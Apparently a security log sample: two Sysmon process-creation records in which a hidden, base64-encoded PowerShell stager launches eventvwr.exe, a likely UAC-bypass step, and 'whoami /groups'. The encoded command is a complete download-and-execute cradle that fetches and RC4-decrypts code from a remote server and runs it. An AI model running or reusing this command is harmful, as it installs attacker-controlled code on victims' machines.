<14>Jan  2 13:46:46 serhatg.local Microsoft-Windows-Sysmon[2072]: {"EventTime":1672667206,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":11157,"ProcessID":2072,"ThreadID":4240,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-01-02 13:46:46.000000\r\nProcessGuid: {341034e7-3a72-62fb-620c-000000000600}\r\nProcessId: 284\r\nImage: C:\\Windows\\System32\\eventvwr.exe\r\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\r\nDescription: Event Viewer Snapin Launcher\r\nProduct: Microsoft  Windows  Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: eventvwr.exe\r\nCommandLine: \"C:\\Windows\\system32\\eventvwr.exe\" \r\nCurrentDirectory: C:\\Users\\user\\\r\nUser: serhatg.local\\user\r\nLogonGuid: {341034e7-b7e7-62f4-503c-020000000000}\r\nLogonId: 0x23C50\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: MD5=3A8EBEB41000296D44EDDF39A505F7E0,SHA256=BE0D401C8B42024B0918394FAA0AA6B494EA537B3C6C2C62C3D9064929F6245B,IMPHASH=5843AE9886BB500E05E07EE59BB5AD42\r\nParentProcessGuid: {341034e7-3431-62fb-510c-000000000600}\r\nParentProcessId: 8040\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABrAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBADQAQQBDADQAQQBNAFEAQQB4AEEARABFAEEATABnAEEAeABBAEQAZwBBAE0AUQBBADYAQQBEAGcAQQBNAEEAQQA0AEEARABnAEEAJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAdwBjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBEAGUAZgBhAHUAbAB0AFcAZQBiAFAAcgBvAHgAeQA7ACQAdwBjAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwBzAGcAWABJAFkAdQBsAGoAJQBbAHQAYgAvAE8ARQBkAEMAPwApADoAKgAhAGEANgAzADkAZQBVAE4AVwBoADEAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAFAAVgBjAFUAbgBBAEUAVgBWAGIAdQB0AGgAPQBBAHUARgBuAGgANQBxAGMANwB1AFcASABYAFAAZgBtAHEAMABNAGcAeAAwAEIAMwBxAE4ATQA9ACIAKQA7ACQAZABhAHQAYQA9ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABhAHQAYQBbADAALgAuADMAXQA7ACQAZABhAHQAYQA9ACQAZABhAHQAYQBbADQALgAuACQAZABhAHQAYQAuAGwAZQBuAGcAdABoAF0AOwAtAGoAbwBpAG4AWwBDAGgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\nParentUser: serhatg.local\\user","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-01-02 13:46:46.000000","ProcessGuid":"{341034e7-3a72-62fb-620c-000000000600}","Image":"C:\\Windows\\System32\\eventvwr.exe","FileVersion":"10.0.19041.1 (WinBuild.160101.0800)","Description":"Event Viewer Snapin Launcher","Product":"Microsoft  Windows  Operating System","Company":"Microsoft Corporation","OriginalFileName":"eventvwr.exe","CommandLine":"\"C:\\Windows\\system32\\eventvwr.exe\" ","CurrentDirectory":"C:\\Users\\user\\","User":"serhatg.local\\user","LogonGuid":"{341034e7-b7e7-62f4-503c-020000000000}","LogonId":"0x23c50","TerminalSessionId":"1","IntegrityLevel":"Medium","Hashes":"MD5=3A8EBEB41000296D44EDDF39A505F7E0,SHA256=BE0D401C8B42024B0918394FAA0AA6B494EA537B3C6C2C62C3D9064929F6245B,IMPHASH=5843AE9886BB500E05E07EE59BB5AD42","ParentProcessGuid":"{341034e7-3431-62fb-510c-000000000600}","ParentProcessId":"8040","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentCommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABrAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBADQAQQBDADQAQQBNAFEAQQB4AEEARABFAEEATABnAEEAeABBAEQAZwBBAE0AUQBBADYAQQBEAGcAQQBNAEEAQQA0AEEARABnAEEAJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAdwBjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBEAGUAZgBhAHUAbAB0AFcAZQBiAFAAcgBvAHgAeQA7ACQAdwBjAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwBzAGcAWABJAFkAdQBsAGoAJQBbAHQAYgAvAE8ARQBkAEMAPwApADoAKgAhAGEANgAzADkAZQBVAE4AVwBoADEAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAFAAVgBjAFUAbgBBAEUAVgBWAGIAdQB0AGgAPQBBAHUARgBuAGgANQBxAGMANwB1AFcASABYAFAAZgBtAHEAMABNAGcAeAAwAEIAMwBxAE4ATQA9ACIAKQA7ACQAZABhAHQAYQA9ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABhAHQAYQBbADAALgAuADMAXQA7ACQAZABhAHQAYQA9ACQAZABhAHQAYQBbADQALgAuACQAZABhAHQAYQAuAGwAZQBuAGcAdABoAF0AOwAtAGoAbwBpAG4AWwBDAGgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA","ParentUser":"serhatg.local\\user","EventReceivedTime":1672667206,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jan  2 13:46:56 serhatg.local Microsoft-Windows-Sysmon[2073]: {"EventTime":1672667216,"Hostname":"serhatg.local","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":11154,"ProcessID":2073,"ThreadID":4241,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-01-02 13:46:56.000000\r\nProcessGuid: {341034e7-3a71-62fb-610c-000000000600}\r\nProcessId: 2212\r\nImage: C:\\Windows\\System32\\whoami.exe\r\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\r\nDescription: whoami - displays logged on user information\r\nProduct: Microsoft  Windows  Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: whoami.exe\r\nCommandLine: \"C:\\Windows\\system32\\whoami.exe\" /groups\r\nCurrentDirectory: C:\\Users\\user\\\r\nUser: serhatg.local\\user\r\nLogonGuid: {341034e7-b7e7-62f4-503c-020000000000}\r\nLogonId: 0x23C50\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88\r\nParentProcessGuid: {341034e7-3431-62fb-510c-000000000600}\r\nParentProcessId: 8040\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABrAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBADQAQQBDADQAQQBNAFEAQQB4AEEARABFAEEATABnAEEAeABBAEQAZwBBAE0AUQBBADYAQQBEAGcAQQBNAEEAQQA0AEEARABnAEEAJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAdwBjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBEAGUAZgBhAHUAbAB0AFcAZQBiAFAAcgBvAHgAeQA7ACQAdwBjAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwBzAGcAWABJAFkAdQBsAGoAJQBbAHQAYgAvAE8ARQBkAEMAPwApADoAKgAhAGEANgAzADkAZQBVAE4AVwBoADEAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAFAAVgBjAFUAbgBBAEUAVgBWAGIAdQB0AGgAPQBBAHUARgBuAGgANQBxAGMANwB1AFcASABYAFAAZgBtAHEAMABNAGcAeAAwAEIAMwBxAE4ATQA9ACIAKQA7ACQAZABhAHQAYQA9ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABhAHQAYQBbADAALgAuADMAXQA7ACQAZABhAHQAYQA9ACQAZABhAHQAYQBbADQALgAuACQAZABhAHQAYQAuAGwAZQBuAGcAdABoAF0AOwAtAGoAbwBpAG4AWwBDAGgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\nParentUser: serhatg.local\\user","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-01-02 13:46:56.000000","ProcessGuid":"{341034e7-3a71-62fb-610c-000000000600}","Image":"C:\\Windows\\System32\\whoami.exe","FileVersion":"10.0.19041.1 (WinBuild.160101.0800)","Description":"whoami - displays logged on user information","Product":"Microsoft  Windows  Operating System","Company":"Microsoft Corporation","OriginalFileName":"whoami.exe","CommandLine":"\"C:\\Windows\\system32\\whoami.exe\" /groups","CurrentDirectory":"C:\\Users\\user\\","User":"serhatg.local\\user","LogonGuid":"{341034e7-b7e7-62f4-503c-020000000000}","LogonId":"0x23c50","TerminalSessionId":"1","IntegrityLevel":"Medium","Hashes":"MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88","ParentProcessGuid":"{341034e7-3431-62fb-510c-000000000600}","ParentProcessId":"8040","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentCommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABrAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBADQAQQBDADQAQQBNAFEAQQB4AEEARABFAEEATABnAEEAeABBAEQAZwBBAE0AUQBBADYAQQBEAGcAQQBNAEEAQQA0AEEARABnAEEAJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAdwBjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBEAGUAZgBhAHUAbAB0AFcAZQBiAFAAcgBvAHgAeQA7ACQAdwBjAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwBzAGcAWABJAFkAdQBsAGoAJQBbAHQAYgAvAE8ARQBkAEMAPwApADoAKgAhAGEANgAzADkAZQBVAE4AVwBoADEAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAFAAVgBjAFUAbgBBAEUAVgBWAGIAdQB0AGgAPQBBAHUARgBuAGgANQBxAGMANwB1AFcASABYAFAAZgBtAHEAMABNAGcAeAAwAEIAMwBxAE4ATQA9ACIAKQA7ACQAZABhAHQAYQA9ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABhAHQAYQBbADAALgAuADMAXQA7ACQAZABhAHQAYQA9ACQAZABhAHQAYQBbADQALgAuACQAZABhAHQAYQAuAGwAZQBuAGcAdABoAF0AOwAtAGoAbwBpAG4AWwBDAGgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA","ParentUser":"serhatg.local\\user","EventReceivedTime":1672667216,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
